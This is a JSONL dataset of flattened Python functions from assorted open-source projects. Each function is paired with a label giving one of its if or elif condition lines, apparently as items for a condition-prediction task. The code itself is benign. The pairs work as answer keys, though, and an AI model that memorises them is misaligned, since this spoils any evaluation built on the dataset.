{"input": "def set_add_delete_state(self): \"Toggle the state for the help list buttons based on list entries.\" if self.helplist.size() < 1: # No entries in list. self.button_helplist_edit.state((\"disabled\",)) self.button_helplist_remove.state((\"disabled\",)) else: # Some entries. if self.helplist.curselection(): # There currently is a selection. self.button_helplist_edit.state((\"!disabled\",)) self.button_helplist_remove.state((\"!disabled\",)) else: # There currently is not a selection. self.button_helplist_edit.state((\"disabled\",)) self.button_helplist_remove.state((\"disabled\",))", "label": "if self . helplist . curselection ( ) :"}
{"input": "def _erase_status(): CodeintelHandler.status_lock.acquire() try: if msg == CodeintelHandler.status_msg.get(lid, [None, None, 0])[1]: view.erase_status(lid) CodeintelHandler.status_msg[lid][1] = None if lid in CodeintelHandler.status_lineno: del CodeintelHandler.status_lineno[lid] finally: CodeintelHandler.status_lock.release()", "label": "if msg == CodeintelHandler . status_msg . get ( lid , [ None , None , 0 ] ) [ 1 ] :"}
{"input": "def PARSE_TWO_PARAMS(x, y): \"\"\"used to convert different possible x/y params to a tuple\"\"\" if y is not None: return (x, y) else: if isinstance(x, (list, tuple)): return (x[0], x[1]) else: if isinstance(x, UNIVERSAL_STRING): x = x.strip() if \",\" in x: return [int(w.strip()) for w in x.split(\",\")] return (x, x)", "label": "if isinstance ( x , ( list , tuple ) ) :"}
{"input": "def cancel_spot_fleet_requests(self, spot_fleet_request_ids, terminate_instances): spot_requests = [] for spot_fleet_request_id in spot_fleet_request_ids: spot_fleet = self.spot_fleet_requests[spot_fleet_request_id] if terminate_instances: spot_fleet.target_capacity = 0 spot_fleet.terminate_instances() spot_requests.append(spot_fleet) del self.spot_fleet_requests[spot_fleet_request_id] return spot_requests", "label": "if terminate_instances :"}
{"input": "def pop(self, key, default=_MISSING): # NB: hit/miss counts are bypassed for pop() with self._lock: try: ret = super(LRI, self).pop(key) except KeyError: if default is _MISSING: raise ret = default else: self._remove_from_ll(key) return ret", "label": "if default is _MISSING :"}
{"input": "def _remove_optional_none_type_hints(self, type_hints, defaults): # If argument has None as a default, typing.get_type_hints adds # optional None to the information it returns. We don't want that. for arg in defaults: if defaults[arg] is None and arg in type_hints: type_ = type_hints[arg] if self._is_union(type_): types = type_.__args__ if len(types) == 2 and types[1] is type(None): type_hints[arg] = types[0]", "label": "if len ( types ) == 2 and types [ 1 ] is type ( None ) :"}
{"input": "def reader(self, myself): ok = True line = \"\" while True: line = sys.stdin.readline().strip() if ok: if not line: ok = False continue elif not line: break else: ok = True self.Q.append(line) os.kill(myself, signal.SIGTERM)", "label": "elif not line :"}
{"input": "def checkout_branch(self, branch): if branch in self.remote_branches: sickrage.app.log.debug( \"Branch checkout: \" + self._find_installed_version() + \"->\" + branch ) if not self.install_requirements(self.current_branch): return False # remove untracked files and performs a hard reset on git branch to avoid update issues if sickrage.app.config.git_reset: self.reset() # fetch all branches self.fetch() __, __, exit_status = self._git_cmd(self._git_path, \"checkout -f \" + branch) if exit_status == 0: return True return False", "label": "if not self . install_requirements ( self . current_branch ) :"}
{"input": "def last_ok(nodes): for i in range(len(nodes) - 1, -1, -1): if ok_node(nodes[i]): node = nodes[i] if isinstance(node, ast.Starred): if ok_node(node.value): return node.value else: return None else: return nodes[i] return None", "label": "if ok_node ( node . value ) :"}
{"input": "def restart(): \"\"\"Restart application.\"\"\" popen_list = [sys.executable, app.MY_FULLNAME] if not app.NO_RESTART: popen_list += app.MY_ARGS if \"--nolaunch\" not in popen_list: popen_list += [\"--nolaunch\"] logger.info(\"Restarting Medusa with {options}\", options=popen_list) # shutdown the logger to make sure it's released the logfile BEFORE it restarts Medusa. logging.shutdown() print(popen_list) subprocess.Popen(popen_list, cwd=os.getcwd())", "label": "if \"--nolaunch\" not in popen_list :"}
{"input": "def StopBackgroundWorkload(self): \"\"\"Stop the background workoad.\"\"\" for workload in background_workload.BACKGROUND_WORKLOADS: if workload.IsEnabled(self): if self.OS_TYPE in workload.EXCLUDED_OS_TYPES: raise NotImplementedError() workload.Stop(self)", "label": "if self . OS_TYPE in workload . EXCLUDED_OS_TYPES :"}
{"input": "def __init__(self, token): self._convert_to_ascii = False self._find = None if token.search is None: return flags = 0 self._match_this_many = 1 if token.options: if \"g\" in token.options: self._match_this_many = 0 if \"i\" in token.options: flags |= re.IGNORECASE if \"a\" in token.options: self._convert_to_ascii = True self._find = re.compile(token.search, flags | re.DOTALL) self._replace = _CleverReplace(token.replace)", "label": "if \"i\" in token . options :"}
{"input": "def _draw_nodes(self, cr, bounding, highlight_items): highlight_nodes = [] for element in highlight_items: if isinstance(element, Edge): highlight_nodes.append(element.src) highlight_nodes.append(element.dst) else: highlight_nodes.append(element) for node in self.nodes: if bounding is None or node._intersects(bounding): node._draw(cr, highlight=(node in highlight_nodes), bounding=bounding)", "label": "if isinstance ( element , Edge ) :"}
{"input": "def _removeCachedRFInfo(self, cache_key, path, removeChildPaths): log.debug(\"_removeCachedRFInfo: cache_key %r, path %r\", cache_key, path) if self._cachedFiles.has_key(cache_key): cache = self._cachedFiles[cache_key] if cache.has_key(path): del cache[path] if removeChildPaths: # Remove all cached paths that are under this directory from remotefilelib import addslash dirPath = addslash(path) for keypath in cache.keys(): if keypath.startswith(dirPath): del cache[keypath]", "label": "if removeChildPaths :"}
{"input": "def write_row(xf, worksheet, row, row_idx, max_column): attrs = {\"r\": \"%d\" % row_idx, \"spans\": \"1:%d\" % max_column} dims = worksheet.row_dimensions if row_idx in dims: row_dimension = dims[row_idx] attrs.update(dict(row_dimension)) with xf.element(\"row\", attrs): for col, cell in row: if cell._value is None and not cell.has_style and not cell._comment: continue el = write_cell(xf, worksheet, cell, cell.has_style)", "label": "if cell . _value is None and not cell . has_style and not cell . _comment :"}
{"input": "def reset_feature_range(data, column_max_value, column_min_value, scale_column_idx): _data = copy.deepcopy(data) for i in scale_column_idx: value = _data.features[i] if value > column_max_value[i]: _data.features[i] = column_max_value[i] elif value < column_min_value[i]: _data.features[i] = column_min_value[i] return _data", "label": "if value > column_max_value [ i ] :"}
{"input": "def test_listing_all_frameworks_and_check_frameworks_by_order(self): \"\"\"List all frameworks and check if frameworks appear by order\"\"\" result = subprocess.check_output(self.command_as_list([UMAKE, \"--list\"])) previous_framework = None for element in result.split(b\"\\n\"): if element.startswith(b\"\\t\"): current_framework = element[: element.find(b\":\")] if previous_framework: self.assertTrue(previous_framework < current_framework) previous_framework = current_framework else: previous_framework = None", "label": "if previous_framework :"}
{"input": "def merge(module_name, tree1, tree2): for child in tree2.node: if isinstance(child, ast.Function): replaceFunction(tree1, child.name, child) elif isinstance(child, ast.Assign): replaceAssign(tree1, child.nodes[0].name, child) elif isinstance(child, ast.Class): replaceClassMethods(tree1, child.name, child) else: raise TranslationError( \"Do not know how to merge %s\" % child, child, module_name ) return tree1", "label": "if isinstance ( child , ast . Function ) :"}
{"input": "def _filter_supported_drivers(): global supported_drivers with Env() as gdalenv: ogrdrv_names = gdalenv.drivers().keys() supported_drivers_copy = supported_drivers.copy() for drv in supported_drivers.keys(): if drv not in ogrdrv_names: del supported_drivers_copy[drv] supported_drivers = supported_drivers_copy", "label": "if drv not in ogrdrv_names :"}
{"input": "def serialize(self, cassette_dict): for interaction in cassette_dict[\"interactions\"]: response = interaction[\"response\"] headers = response[\"headers\"] if \"Content-Range\" in headers and \"Content-Disposition\" in headers: rg, size, filename = self._parse_headers(headers) content = response[\"body\"][\"string\"] if rg[0] == 0 and rg[1] + 1 == size: with open(join(self.directory, filename), \"wb\") as f: f.write(content) del response[\"body\"][\"string\"] return self.base_serializer.serialize(cassette_dict)", "label": "if \"Content-Range\" in headers and \"Content-Disposition\" in headers :"}
{"input": "def verify_software_token(self, access_token, user_code): for user_pool in self.user_pools.values(): if access_token in user_pool.access_tokens: _, username = user_pool.access_tokens[access_token] user = user_pool.users.get(username) if not user: raise UserNotFoundError(username) user.token_verified = True return {\"Status\": \"SUCCESS\"} else: raise NotAuthorizedError(access_token)", "label": "if not user :"}
{"input": "def __fixdict(self, dict): for key in dict.keys(): if key[:6] == \"start_\": tag = key[6:] start, end = self.elements.get(tag, (None, None)) if start is None: self.elements[tag] = getattr(self, key), end elif key[:4] == \"end_\": tag = key[4:] start, end = self.elements.get(tag, (None, None)) if end is None: self.elements[tag] = start, getattr(self, key)", "label": "if key [ : 6 ] == \"start_\" :"}
{"input": "def generate_playlist(sourcefile): \"\"\"Generate a playlist from video titles in sourcefile\"\"\" # Hooks into this, check if the argument --description is present if \"--description\" in sourcefile or \"-d\" in sourcefile: description_generator(sourcefile) return expanded_sourcefile = path.expanduser(sourcefile) if not check_sourcefile(expanded_sourcefile): g.message = util.F(\"mkp empty\") % expanded_sourcefile else: queries = read_sourcefile(expanded_sourcefile) g.message = util.F(\"mkp parsed\") % (len(queries), sourcefile) if queries: create_playlist(queries) g.message = util.F(\"pl help\") g.content = content.playlists_display()", "label": "if queries :"}
{"input": "def flush(self): for record in self._unique_ordered_records: record.message = self._format_string.format( message=record.message, count=self._message_to_count[record.message] ) # record.dispatcher is the logger who created the message, # it's sometimes supressed (by logbook.info for example) if record.dispatcher is not None: dispatch = record.dispatcher.call_handlers else: dispatch = dispatch_record dispatch(record) self.clear()", "label": "if record . dispatcher is not None :"}
{"input": "def __init__(self, name, contents): self.name = name self.all_entries = [] self.attr = [] self.child = [] self.seq_child = [] for entry in contents: clean_entry = entry.rstrip(\"*\") self.all_entries.append(clean_entry) if entry.endswith(\"**\"): self.seq_child.append(clean_entry) elif entry.endswith(\"*\"): self.child.append(clean_entry) else: self.attr.append(entry)", "label": "if entry . endswith ( \"**\" ) :"}
{"input": "def test_empty_condition_node(cond_node): for node in [cond_node.true_node, cond_node.false_node]: if node is None: continue if type(node) is CodeNode and BaseNode.test_empty_node(node.node): continue if BaseNode.test_empty_node(node): continue return False return True", "label": "if BaseNode . test_empty_node ( node ) :"}
{"input": "def test_deprecated_format_string(obj, fmt_str, should_raise_warning): if sys.version_info[0] == 3 and sys.version_info[1] >= 4: if should_raise_warning: self.assertRaises(TypeError, format, obj, fmt_str) else: try: format(obj, fmt_str) except TypeError: self.fail(\"object.__format__ raised TypeError unexpectedly\") else: with warnings.catch_warnings(record=True) as w: warnings.simplefilter(\"always\", DeprecationWarning) format(obj, fmt_str)", "label": "if should_raise_warning :"}
{"input": "def get_queryset(self): if self.queryset is not None: return self.queryset._clone() elif self.model is not None: qs = self.model._default_manager if self.model in access_registry: access_class = access_registry[self.model] if access_class.select_related: qs = qs.select_related(*access_class.select_related) if access_class.prefetch_related: qs = qs.prefetch_related(*access_class.prefetch_related) return qs else: return super(GenericAPIView, self).get_queryset()", "label": "if self . model in access_registry :"}
{"input": "def ping_task(): try: if self._protocol.peer_manager.peer_is_good(peer): if peer not in self._protocol.routing_table.get_peers(): self._protocol.add_peer(peer) return await self._protocol.get_rpc_peer(peer).ping() except (asyncio.TimeoutError, RemoteException): pass", "label": "if self . _protocol . peer_manager . peer_is_good ( peer ) :"}
{"input": "def _validate_usage(schema_argument, variable_used): if isinstance(schema_argument.gql_type, GraphQLNonNull) and not isinstance( variable_used.type, NonNullTypeNode ): has_variable_a_df = not isinstance( variable_used.default_value, (NullValueNode, type(None)) ) has_argument_a_df = schema_argument.default_value is not None if not has_variable_a_df and not has_argument_a_df: return False return _validate_type_compatibility( variable_used.type, schema_argument.gql_type.gql_type ) return _validate_type_compatibility(variable_used.type, schema_argument.gql_type)", "label": "if not has_variable_a_df and not has_argument_a_df :"}
{"input": "def _add_kid(key, x): if x is None: kids[key] = None else: if type(x) in (type([]), type(())): x1 = [i for i in x if isinstance(i, TVTKBase)] if x1: kids[key] = x1 elif isinstance(x, TVTKBase): if hasattr(x, \"__iter__\"): # Don't add iterable objects that contain non # acceptable nodes if len(list(x)) and isinstance(list(x)[0], TVTKBase): kids[key] = x else: kids[key] = x", "label": "if hasattr ( x , \"__iter__\" ) :"}
{"input": "def postCreate(node, menu): with node.scriptNode().context(): if node[\"in\"].getInput(): cropFormat = node[\"in\"][\"format\"].getValue() else: cropFormat = GafferImage.FormatPlug.getDefaultFormat( node.scriptNode().context() ) node[\"area\"].setValue(cropFormat.getDisplayWindow())", "label": "if node [ \"in\" ] . getInput ( ) :"}
{"input": "def normalize_stroke(stroke): letters = set(stroke) if letters & _NUMBERS: if system.NUMBER_KEY in letters: stroke = stroke.replace(system.NUMBER_KEY, \"\") # Insert dash when dealing with 'explicit' numbers m = _IMPLICIT_NUMBER_RX.search(stroke) if m is not None: start = m.start(2) return stroke[:start] + \"-\" + stroke[start:] if \"-\" in letters: if stroke.endswith(\"-\"): stroke = stroke[:-1] elif letters & system.IMPLICIT_HYPHENS: stroke = stroke.replace(\"-\", \"\") return stroke", "label": "if system . NUMBER_KEY in letters :"}
{"input": "def vim_k(self): \"\"\"Cursor up N lines.\"\"\" if self.is_text_wrapper(self.w): for z in range(self.n1 * self.n): if self.state == \"visual\": self.do(\"previous-line-extend-selection\") else: self.do(\"previous-line\") self.done() elif self.in_tree(self.w): self.do(\"goto-prev-visible\") self.done() else: self.quit()", "label": "if self . state == \"visual\" :"}
{"input": "def parseTime(timeStr): regex = re.compile(constants.PARSE_TIME_REGEX) parts = regex.match(timeStr) if not parts: return parts = parts.groupdict() time_params = {} for (name, param) in parts.items(): if param: if name == \"miliseconds\": time_params[\"microseconds\"] = int(param) * 1000 else: time_params[name] = int(param) return datetime.timedelta(**time_params).total_seconds()", "label": "if name == \"miliseconds\" :"}
{"input": "def update(self, other=None, **kwargs): if other is not None: if hasattr(other, \"items\"): other = other.items() for key, value in other: if key in kwargs: raise TensorforceError.value( name=\"NestedDict.update\", argument=\"key\", value=key, condition=\"specified twice\", ) self[key] = value for key, value in kwargs.items(): self[key] = value", "label": "if key in kwargs :"}
{"input": "def to_string(self, ostream=None, verbose=None, precedence=0): \"\"\"Print this expression\"\"\" if ostream is None: ostream = sys.stdout _verbose = ( pyomo.core.base.expr_common.TO_STRING_VERBOSE if verbose is None else verbose ) ostream.write(self.cname() + \"( \") first = True for arg in self._args: if first: first = False elif _verbose: ostream.write(\" , \") else: ostream.write(\", \") arg.to_string(ostream=ostream, precedence=self._precedence(), verbose=verbose) ostream.write(\" )\")", "label": "elif _verbose :"}
{"input": "def apply_gradient_for_batch(inputs, labels, weights, loss): with tf.GradientTape() as tape: outputs = self.model(inputs, training=True) if isinstance(outputs, tf.Tensor): outputs = [outputs] if self._loss_outputs is not None: outputs = [outputs[i] for i in self._loss_outputs] batch_loss = loss(outputs, labels, weights) if variables is None: vars = self.model.trainable_variables else: vars = variables grads = tape.gradient(batch_loss, vars) self._tf_optimizer.apply_gradients(zip(grads, vars)) self._global_step.assign_add(1) return batch_loss", "label": "if self . _loss_outputs is not None :"}
{"input": "def check_all(self, strict=False): \"\"\"run sanity check on all keys, issue warning if out of sync\"\"\" same = self._is_same_value for path, (orig, expected) in iteritems(self._state): if same(self._get_path(path), expected): continue msg = \"another library has patched resource: %r\" % path if strict: raise RuntimeError(msg) else: warn(msg, PasslibRuntimeWarning)", "label": "if same ( self . _get_path ( path ) , expected ) :"}
{"input": "def setup_child(self, child): child.parent = self if self.document: child.document = self.document if child.source is None: child.source = self.document.current_source if child.line is None: child.line = self.document.current_line", "label": "if child . line is None :"}
{"input": "def shift_expr(self, nodelist): # shift_expr ('<<'|'>>' shift_expr)* node = self.com_node(nodelist[0]) for i in range(2, len(nodelist), 2): right = self.com_node(nodelist[i]) if nodelist[i - 1][0] == token.LEFTSHIFT: node = LeftShift([node, right], lineno=nodelist[1][2]) elif nodelist[i - 1][0] == token.RIGHTSHIFT: node = RightShift([node, right], lineno=nodelist[1][2]) else: raise ValueError(\"unexpected token: %s\" % nodelist[i - 1][0]) return node", "label": "elif nodelist [ i - 1 ] [ 0 ] == token . RIGHTSHIFT :"}
{"input": "def styleRow(self, row, selected): if row != -1: if selected: self.getRowFormatter().addStyleName(row, \"midpanel-SelectedRow\") else: self.getRowFormatter().removeStyleName(row, \"midpanel-SelectedRow\")", "label": "if selected :"}
{"input": "def __call__(self, img): img = self.topil(img) ops = random.choices(self.augment_list, k=self.n) for op, minval, maxval in ops: if random.random() > random.uniform(0.2, 0.8): continue val = (float(self.m) / 30) * float(maxval - minval) + minval img = op(img, val) return img", "label": "if random . random ( ) > random . uniform ( 0.2 , 0.8 ) :"}
{"input": "def run(self, **inputs): if self.inputs.copy_inputs: self.inputs.subjects_dir = os.getcwd() if \"subjects_dir\" in inputs: inputs[\"subjects_dir\"] = self.inputs.subjects_dir copy2subjdir(self, self.inputs.surface, \"surf\") copy2subjdir(self, self.inputs.curvfile1, \"surf\") copy2subjdir(self, self.inputs.curvfile2, \"surf\") return super(CurvatureStats, self).run(**inputs)", "label": "if \"subjects_dir\" in inputs :"}
{"input": "def get_func_name(obj): if inspect.ismethod(obj): match = RE_BOUND_METHOD.match(repr(obj)) if match: cls = match.group(\"class\") if not cls: return match.group(\"name\") return \"%s.%s\" % (match.group(\"class\"), match.group(\"name\")) return None", "label": "if not cls :"}
{"input": "def local_path_export(at_start=True, env_cmd=None): \"\"\"Retrieve paths to local install, also including environment paths if env_cmd included.\"\"\" paths = [get_bcbio_bin()] if env_cmd: env_path = os.path.dirname(get_program_python(env_cmd)) if env_path not in paths: paths.insert(0, env_path) if at_start: return 'export PATH=%s:\"$PATH\" && ' % (\":\".join(paths)) else: return 'export PATH=\"$PATH\":%s && ' % (\":\".join(paths))", "label": "if env_path not in paths :"}
{"input": "def copystat(src, dst): \"\"\"Copy all stat info (mode bits, atime, mtime, flags) from src to dst\"\"\" st = os.stat(src) mode = stat.S_IMODE(st.st_mode) if hasattr(os, \"utime\"): os.utime(dst, (st.st_atime, st.st_mtime)) if hasattr(os, \"chmod\"): os.chmod(dst, mode) if hasattr(os, \"chflags\") and hasattr(st, \"st_flags\"): try: os.chflags(dst, st.st_flags) except OSError as why: if not hasattr(errno, \"EOPNOTSUPP\") or why.errno != errno.EOPNOTSUPP: raise", "label": "if not hasattr ( errno , \"EOPNOTSUPP\" ) or why . errno != errno . EOPNOTSUPP :"}
{"input": "def _asdict(self, *, to_string: bool = False) -> dict: res = [] for key in self._keys: value = getattr(self, key) if isinstance(value, Struct): value = value._asdict(to_string=to_string) elif to_string: value = str(value) res.append((key, value)) return dict(res)", "label": "elif to_string :"}
{"input": "def _SI(size, K=1024, i=\"i\"): \"\"\"Return size as SI string.\"\"\" if 1 < K <= size: f = float(size) for si in iter(\"KMGPTE\"): f /= K if f < K: return \" or %.1f %s%sB\" % (f, si, i) return \"\"", "label": "if f < K :"}
{"input": "def _flatten(*args): arglist = [] for arg in args: if isinstance(arg, _Block): if arg.vhdl_code is not None: arglist.append(arg.vhdl_code) continue else: arg = arg.subs if id(arg) in _userCodeMap[\"vhdl\"]: arglist.append(_userCodeMap[\"vhdl\"][id(arg)]) elif isinstance(arg, (list, tuple, set)): for item in arg: arglist.extend(_flatten(item)) else: arglist.append(arg) return arglist", "label": "if isinstance ( arg , _Block ) :"}
{"input": "def new_token(self): data = '{{\"username\": \"{}\", \"password\": \"{}\"}}'.format(self.username, self.password) try: resp = requests.post( \"https://api.zoomeye.org/user/login\", data=data, ) if resp.status_code != 401 and \"access_token\" in resp.json(): content = resp.json() self.token = content[\"access_token\"] self.headers = {\"Authorization\": \"JWT %s\" % self.token} return True except Exception as ex: logger.error(str(ex)) return False", "label": "if resp . status_code != 401 and \"access_token\" in resp . json ( ) :"}
{"input": "def finalize_computation( self, transaction: SignedTransactionAPI, computation: ComputationAPI ) -> ComputationAPI: computation = super().finalize_computation(transaction, computation) # # EIP161 state clearing # touched_accounts = collect_touched_accounts(computation) for account in touched_accounts: should_delete = self.vm_state.account_exists( account ) and self.vm_state.account_is_empty(account) if should_delete: self.vm_state.logger.debug2( \"CLEARING EMPTY ACCOUNT: %s\", encode_hex(account), ) self.vm_state.delete_account(account) return computation", "label": "if should_delete :"}
{"input": "def send_messages(self, text, user_ids): broken_items = [] if not user_ids: self.logger.info(\"User must be at least one.\") return broken_items self.logger.info(\"Going to send %d messages.\" % (len(user_ids))) for user in tqdm(user_ids): if not self.send_message(text, user): self.error_delay() broken_items = user_ids[user_ids.index(user) :] break return broken_items", "label": "if not self . send_message ( text , user ) :"}
{"input": "def editable_cpp_info(self): if self._layout_file: if os.path.isfile(self._layout_file): return EditableLayout(self._layout_file) else: raise ConanException(\"Layout file not found: %s\" % self._layout_file)", "label": "if os . path . isfile ( self . _layout_file ) :"}
{"input": "def to_python(self, value): if isinstance(value, list) and len(value) == 2 and isinstance(value[0], str): filename, payload = value try: payload = base64.b64decode(payload) except TypeError: pass else: if self.storage.exists(filename): self.storage.delete(filename) self.storage.save(filename, ContentFile(payload)) return filename return value", "label": "if self . storage . exists ( filename ) :"}
{"input": "def update_defaults(self, *values, **kwargs): for value in values: if type(value) == dict: self.DEFAULT_CONFIGURATION.update(value) elif isinstance(value, types.ModuleType): self.__defaults_from_module(value) elif isinstance(value, str): if os.path.exists(value): self.__defaults_from_file(value) else: logger.warning(\"Configuration file {} does not exist.\".format(value)) elif isinstance(value, type(None)): pass else: raise ValueError(\"Cannot interpret {}\".format(value)) self.DEFAULT_CONFIGURATION.update(kwargs)", "label": "elif isinstance ( value , types . ModuleType ) :"}
{"input": "def __getitem__(self, item: str) -> Any: try: return self.data[item] except KeyError: for g in self.extended_groups(): try: r = g.data[item] return r except KeyError: continue r = self.defaults.data.get(item) if r is not None: return r raise", "label": "if r is not None :"}
{"input": "def _parse_arguments(self, handler_method): spec = DynamicArgumentParser().parse(self._argspec, self.longname) if not self._supports_kwargs: if spec.kwargs: raise DataError( \"Too few '%s' method parameters for **kwargs \" \"support.\" % self._run_keyword_method_name ) if spec.kwonlyargs: raise DataError( \"Too few '%s' method parameters for \" \"keyword-only arguments support.\" % self._run_keyword_method_name ) spec.types = GetKeywordTypes(self.library.get_instance())(self._handler_name) return spec", "label": "if spec . kwonlyargs :"}
{"input": "def test_orphans_match(self): \"\"\"api handles last three chars match query\"\"\" response = self.client.get(\"%s?q=%s\" % (self.api_link, self.user.username[-3:])) self.assertEqual(response.status_code, 200) response_json = response.json() self.assertIn(\"users\", [p[\"id\"] for p in response_json]) for provider in response_json: if provider[\"id\"] == \"users\": results = provider[\"results\"][\"results\"] self.assertEqual(len(results), 1) self.assertEqual(results[0][\"id\"], self.user.id)", "label": "if provider [ \"id\" ] == \"users\" :"}
{"input": "def test_costs_1D_noisy_names(signal_bkps_1D_noisy, cost_name): signal, bkps = signal_bkps_1D_noisy cost = cost_factory(cost_name) cost.fit(signal) cost.fit(signal.flatten()) cost.error(0, 100) cost.error(100, signal.shape[0]) cost.error(10, 50) cost.sum_of_costs(bkps) with pytest.raises(NotEnoughPoints): if cost_name == \"cosine\": cost.min_size = 4 cost.error(1, 2) else: cost.error(1, 2)", "label": "if cost_name == \"cosine\" :"}
{"input": "def _delete_access_key(self, params): sys.stdout.write(\"Deleting the IAM user access keys... \") list_access_keys = self.iam.get_paginator(\"list_access_keys\") try: for response in list_access_keys.paginate(UserName=params.user_name): for access_key in response[\"AccessKeyMetadata\"]: self.iam.delete_access_key( UserName=params.user_name, AccessKeyId=access_key[\"AccessKeyId\"] ) except ClientError as e: if e.response.get(\"Error\", {}).get(\"Code\") != \"NoSuchEntity\": raise e sys.stdout.write(\"DONE\\n\")", "label": "if e . response . get ( \"Error\" , { } ) . get ( \"Code\" ) != \"NoSuchEntity\" :"}
{"input": "def run_pending(self, now=None): \"\"\"Runs the command if scheduled\"\"\" now = now or datetime.now() if self.is_enabled(): if self.last_run is None: self.last_run = now next_time = self.schedule(self.last_run).get_next() if next_time < now: self.last_run = now return self.run() return -1", "label": "if next_time < now :"}
{"input": "def parse_row(cls, doc_row): row = {} for field_name, field in FIELD_MAP.items(): if len(doc_row) > field[1]: field_value = doc_row[field[1]] else: field_value = \"\" if len(field) >= 3 and callable(field[2]): field_value = field[2](field_value) row[field_name] = field_value return row", "label": "if len ( doc_row ) > field [ 1 ] :"}
{"input": "def list(self, items, columns=4, width=80): items = list(sorted(items)) colw = width // columns rows = (len(items) + columns - 1) // columns for row in range(rows): for col in range(columns): i = col * rows + row if i < len(items): self.output.write(items[i]) if col < columns - 1: self.output.write(\" \" + \" \" * (colw - 1 - len(items[i]))) self.output.write(\"\\n\")", "label": "if col < columns - 1 :"}
{"input": "def _on_message(self, storage, data): if \"_meta\" in data and \"session_id\" in data[\"_meta\"]: self.session_id = data[\"_meta\"][\"session_id\"] if is_blacklisted(data.get(\"url\", \"\")): blacklist_error(data, self) return command = data[\"_command\"] command = self._handlers.get(command, command) with data_store_context(): commands = Commands(data, self, storage) result = getattr(commands, command, lambda: None)() if result: result.setdefault(\"_command\", data.get(\"_callback\", command)) if \"_meta\" in data and \"id\" in data[\"_meta\"]: result[\"id\"] = data[\"_meta\"][\"id\"] return result", "label": "if \"_meta\" in data and \"id\" in data [ \"_meta\" ] :"}
{"input": "def get_model_params(problem_type: str, hyperparameters): penalty = hyperparameters.get(\"penalty\", L2) handle_text = hyperparameters.get(\"handle_text\", IGNORE) if problem_type == REGRESSION: if penalty == L2: model_class = Ridge elif penalty == L1: model_class = Lasso else: logger.warning( \"Unknown value for penalty {} - supported types are [l1, l2] - falling back to l2\".format( penalty ) ) penalty = L2 model_class = Ridge else: model_class = LogisticRegression return model_class, penalty, handle_text", "label": "if penalty == L2 :"}
{"input": "def get_queryset(self): if self.queryset is not None: return self.queryset._clone() elif self.model is not None: qs = self.model._default_manager if self.model in access_registry: access_class = access_registry[self.model] if access_class.select_related: qs = qs.select_related(*access_class.select_related) if access_class.prefetch_related: qs = qs.prefetch_related(*access_class.prefetch_related) return qs else: return super(GenericAPIView, self).get_queryset()", "label": "if access_class . prefetch_related :"}
{"input": "def map_package(shutit_pexpect_session, package, install_type): \"\"\"If package mapping exists, then return it, else return package.\"\"\" if package in PACKAGE_MAP.keys(): for itype in PACKAGE_MAP[package].keys(): if itype == install_type: ret = PACKAGE_MAP[package][install_type] if isinstance(ret, str): return ret if callable(ret): ret(shutit_pexpect_session) return \"\" # Otherwise, simply return package return package", "label": "if callable ( ret ) :"}
{"input": "def find_missing_cache_files( self, modules: Dict[str, str], manager: build.BuildManager ) -> Set[str]: ignore_errors = True missing = {} for id, path in modules.items(): meta = build.find_cache_meta(id, path, manager) if not build.validate_meta(meta, id, path, ignore_errors, manager): missing[id] = path return set(missing.values())", "label": "if not build . validate_meta ( meta , id , path , ignore_errors , manager ) :"}
{"input": "def parse_percent_formats(data, tree): percent_formats = data.setdefault(\"percent_formats\", {}) for elem in tree.findall(\".//percentFormats/percentFormatLength\"): type = elem.attrib.get(\"type\") if _should_skip_elem(elem, type, percent_formats): continue pattern = text_type(elem.findtext(\"percentFormat/pattern\")) percent_formats[type] = numbers.parse_pattern(pattern)", "label": "if _should_skip_elem ( elem , type , percent_formats ) :"}
{"input": "def nan2none(l): for idx, val in enumerate(l): if isinstance(val, Sequence): l[idx] = nan2none(l[idx]) elif isnum(val) and math.isnan(val): l[idx] = None return l", "label": "if isinstance ( val , Sequence ) :"}
{"input": "def process(self, message: Message, **kwargs: Any) -> None: for attribute in DENSE_FEATURIZABLE_ATTRIBUTES: if message.get(attribute): message.set( SPACY_DOCS[attribute], self.doc_for_text(message.get(attribute)) )", "label": "if message . get ( attribute ) :"}
{"input": "def accessSlice(self, node): self.visit(node.value) node.obj = self.getObj(node.value) self.access = _access.INPUT lower, upper = node.slice.lower, node.slice.upper if lower: self.visit(lower) if upper: self.visit(upper) if isinstance(node.obj, intbv): if self.kind == _kind.DECLARATION: self.require(lower, \"Expected leftmost index\") leftind = self.getVal(lower) if upper: rightind = self.getVal(upper) else: rightind = 0 node.obj = node.obj[leftind:rightind]", "label": "if upper :"}
{"input": "def forg(x, prec=3): if prec == 3: # for 3 decimals if (abs(x) >= 1e4) or (abs(x) < 1e-4): return \"%9.3g\" % x else: return \"%9.3f\" % x elif prec == 4: if (abs(x) >= 1e4) or (abs(x) < 1e-4): return \"%10.4g\" % x else: return \"%10.4f\" % x else: raise ValueError( \"`prec` argument must be either 3 or 4, not {prec}\".format(prec=prec) )", "label": "if ( abs ( x ) >= 1e4 ) or ( abs ( x ) < 1e-4 ) :"}
{"input": "def pseudo_raw_input(self, prompt): \"\"\"copied from cmd's cmdloop; like raw_input, but accounts for changed stdin, stdout\"\"\" if self.use_rawinput: try: line = raw_input(prompt) except EOFError: line = \"EOF\" else: self.stdout.write(prompt) self.stdout.flush() line = self.stdin.readline() if not len(line): line = \"EOF\" else: if line[-1] == \"\\n\": # this was always true in Cmd line = line[:-1] return line", "label": "if not len ( line ) :"}
{"input": "def _find_first_unescaped(dn, char, pos): while True: pos = dn.find(char, pos) if pos == -1: break # no char found if pos > 0 and dn[pos - 1] != \"\\\\\": # unescaped char break elif pos > 1 and dn[pos - 1] == \"\\\\\": # may be unescaped escaped = True for c in dn[pos - 2 : 0 : -1]: if c == \"\\\\\": escaped = not escaped else: break if not escaped: break pos += 1 return pos", "label": "elif pos > 1 and dn [ pos - 1 ] == \"\\\\\" :"}
{"input": "def update_user(username): permission = UserAdminPermission(username) if permission.can(): update_request = request.get_json() if \"password\" in update_request: logger.debug(\"Updating user password\") model.user.change_password( get_authenticated_user(), update_request[\"password\"] ) return jsonify( { \"username\": get_authenticated_user().username, \"email\": get_authenticated_user().email, } ) abort(403)", "label": "if \"password\" in update_request :"}
{"input": "def pages(self): if hasattr(self, \"_pages\"): return self._pages doctop = 0 pp = self.pages_to_parse self._pages = [] for i, page in enumerate(PDFPage.create_pages(self.doc)): page_number = i + 1 if pp is not None and page_number not in pp: continue p = Page(self, page, page_number=page_number, initial_doctop=doctop) self._pages.append(p) doctop += p.height return self._pages", "label": "if pp is not None and page_number not in pp :"}
